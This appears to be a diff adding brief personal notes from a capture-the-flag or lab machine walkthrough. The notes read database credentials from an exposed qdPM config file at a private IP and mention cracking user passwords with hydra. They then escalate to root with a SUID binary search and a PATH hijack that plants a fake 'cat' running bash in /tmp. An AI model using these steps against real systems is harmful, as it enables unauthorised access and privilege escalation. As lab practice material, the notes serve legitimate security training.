@@ -1,0 +1,14 @@
+http://10.0.0.205/core/config/databases.yml
+mysql -u qdpmadmin -h 10.0.0.205 -p
+SHOW databases;
+connect name_of_database;
+SELECT * FROM name_of_table;
+#after using hydra we find the passswords for both travis and dexter.
+#after gaining acces to the machine to gain root.
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+echo '/bin/bash' > /tmp/cat
+chmod +x /tmp/cat; chmod 777 tmp/cat
+export PATH=/tmp:$PATH
+echo $PATH
+#from the opt foler
+./get_access
